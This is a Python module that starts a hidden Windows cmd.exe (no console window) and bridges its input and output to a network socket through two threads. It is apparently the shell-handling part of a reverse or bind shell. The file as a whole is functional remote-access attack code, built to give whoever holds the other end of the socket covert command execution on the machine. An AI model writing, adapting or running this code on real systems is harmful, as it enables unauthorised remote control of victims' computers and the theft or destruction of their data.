"""Windows shell spawning with socket redirection"""
import sys
import os
import socket
import subprocess
import threading


def spawn_shell(socket_obj: socket.socket) -> bool:
    """
    Spawn cmd.exe and redirect I/O to the socket
    
    Parameters
    ----------
    socket_obj : socket.socket
        Connected socket to redirect shell I/O to
    
    Returns
    -------
    bool
        True if successful, False otherwise
    """
    shell_cmd = "cmd.exe"

    try:
        return spawn_shell_threaded(socket_obj, shell_cmd)
        
    except Exception as e:
        print(f"[!] Shell spawn error: {e}", file=sys.stderr)
        return False


def spawn_shell_threaded(socket_obj: socket.socket, shell_cmd: str) -> bool:
    """
    Fallback method using threads to bridge socket and subprocess.
    This is often the most reliable way on Windows to handle socket-to-process I/O.
    """
    try:
        creation_flags = 0
        if sys.platform.startswith('win'):
            creation_flags = subprocess.CREATE_NO_WINDOW
            
        process = subprocess.Popen(
            [shell_cmd],
            stdin=subprocess.PIPE,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            creationflags=creation_flags,
            shell=True
        )
        
        stop_event = threading.Event()
        
        def socket_to_process():
            """Read from socket, write to process stdin"""
            try:
                while not stop_event.is_set() and process.poll() is None:
                    socket_obj.settimeout(1.0)
                    try:
                        data = socket_obj.recv(4096)
                        if not data:
                            break
                        process.stdin.write(data)
                        process.stdin.flush()
                    except socket.timeout:
                        continue
                    except Exception:
                        break
            except Exception:
                pass
            finally:
                stop_event.set()
                try:
                    process.terminate()
                except:
                    pass
        
        def process_to_socket():
            """Read from process stdout, write to socket"""
            try:
                while not stop_event.is_set() and process.poll() is None:
                    data = process.stdout.read(1)
                    if not data:
                        break
                    socket_obj.send(data)
            except Exception:
                pass
            finally:
                stop_event.set()
                try:
                    process.terminate()
                except:
                    pass
        
        t1 = threading.Thread(target=socket_to_process, daemon=True)
        t2 = threading.Thread(target=process_to_socket, daemon=True)
        
        t1.start()
        t2.start()

        while t1.is_alive() or t2.is_alive():
            t1.join(0.5)
            t2.join(0.5)
            if stop_event.is_set():
                break
        
        return True
        
    except Exception as e:
        print(f"[!] Threaded shell error: {e}", file=sys.stderr)
        return False
